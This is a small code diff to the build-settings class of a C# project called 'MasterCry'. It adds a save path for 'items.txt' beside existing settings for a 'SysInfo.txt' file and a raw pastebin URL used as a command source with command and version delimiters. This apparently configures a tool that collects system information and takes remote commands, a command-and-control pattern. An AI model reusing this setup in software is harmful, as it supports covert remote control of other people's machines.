@@ -19,6 +19,8 @@ namespace MasterCry
     class BuildVars
     {
         public static string Save_Location = "SysInfo.txt";
+        public static string Save_Items_Location = "items.txt";
+
         public static string Command_URL = "https://pastebin.com/raw/QF4BXM6D";
         public static string Command_URL_Symbol = "###";
         public static string Command_VER_Symbol = "$$$";
